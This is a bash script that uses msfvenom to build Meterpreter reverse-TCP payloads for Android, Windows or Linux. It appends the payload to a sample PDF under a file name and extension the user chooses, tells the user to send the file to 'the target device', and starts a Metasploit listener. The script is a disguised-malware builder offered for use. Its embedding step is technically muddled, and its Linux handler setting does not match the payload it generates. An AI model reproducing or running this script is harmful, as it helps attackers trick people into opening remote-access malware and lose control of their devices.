#!/bin/bash

# Function to display usage
usage() {
    echo "Usage: $0"
    echo "This script generates an obfuscated payload and embeds it into a PDF."
    exit 1
}

# Check if msfvenom is installed
if ! command -v msfvenom &> /dev/null; then
    echo "msfvenom could not be found. Please install Metasploit Framework."
    exit 1
fi

# Ask for LHOST and LPORT
read -p "Enter LHOST (your IP address): " LHOST
read -p "Enter LPORT (your listening port): " LPORT

# Ask for the file extension to keep
read -p "Enter the file extension to keep (e.g., pdf, docx): " EXTENSION

# Ask for the final file name
read -p "Enter the final file name (without extension): " FINAL_NAME

# Prompt user for OS choice
echo "Which OS payload do you want to create? (android/windows/linux)"
read os_choice

# Generate the payload based on user choice
case $os_choice in
    android)
        echo "You selected Android. Generating Android payload..."
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o obfuscated_payload.apk
        ;;
    windows)
        echo "You selected Windows. Generating Windows payload..."
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o obfuscated_payload.exe
        ;;
    linux)
        echo "You selected Linux. Generating Linux payload..."
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o obfuscated_payload.elf
        ;;
    *)
        echo "Invalid option. Please select android, windows, or linux."
        exit 1
        ;;
esac

# Check if the payload was created successfully
if [ ! -f obfuscated_payload.* ]; then
    echo "Failed to create payload."
    exit 1
fi

# Create a sample PDF file
echo "Creating a sample PDF file..."
echo "This is a sample PDF file." > sample.pdf

# Embed the payload into the PDF
echo "Embedding the payload into the PDF..."
cat sample.pdf obfuscated_payload.* > "${FINAL_NAME}.${EXTENSION}"

# Check if the final file was created successfully
if [ ! -f "${FINAL_NAME}.${EXTENSION}" ]; then
    echo "Failed to create final file."
    exit 1
fi

# Clean up intermediate files
rm obfuscated_payload.* sample.pdf

echo "Payload successfully created and embedded in ${FINAL_NAME}.${EXTENSION}."
echo "You can now transfer ${FINAL_NAME}.${EXTENSION} to the target device."

# Instructions for setting up the listener
echo "To set up the listener, run the following commands in Metasploit:"
echo "msfconsole"
echo "use exploit/multi/handler"
echo "set payload ${os_choice}/meterpreter/reverse_tcp"
echo "set LHOST $LHOST"
echo "set LPORT $LPORT"
echo "exploit"

# Optionally, you can start the listener automatically
echo "Starting the listener automatically..."
msfconsole -q -x "use exploit/multi/handler; set payload ${os_choice}/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"

exit 0
